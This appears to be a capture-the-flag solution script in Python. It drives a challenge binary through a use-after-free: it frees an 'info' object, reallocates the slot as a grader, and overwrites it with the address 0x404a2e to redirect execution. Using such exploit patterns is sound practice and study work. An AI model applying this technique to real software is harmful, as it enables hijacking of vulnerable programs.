#!/usr/bin/env python3
import sys

sys.stdout.buffer.write(b'setup-info\n')
sys.stdout.buffer.write(b'free-info\n')
sys.stdout.buffer.write(b'setup-grader UAF\n')
sys.stdout.buffer.flush()
sys.stdout.buffer.write(b'set-info-0 \x2e\x4a\x40\x00\x00\x00\x00\x00\n') # 0x404a2e
sys.stdout.buffer.flush()

sys.stdout.buffer.write(b'grade xaq7pj\n')
sys.stdout.buffer.write(b'exit')
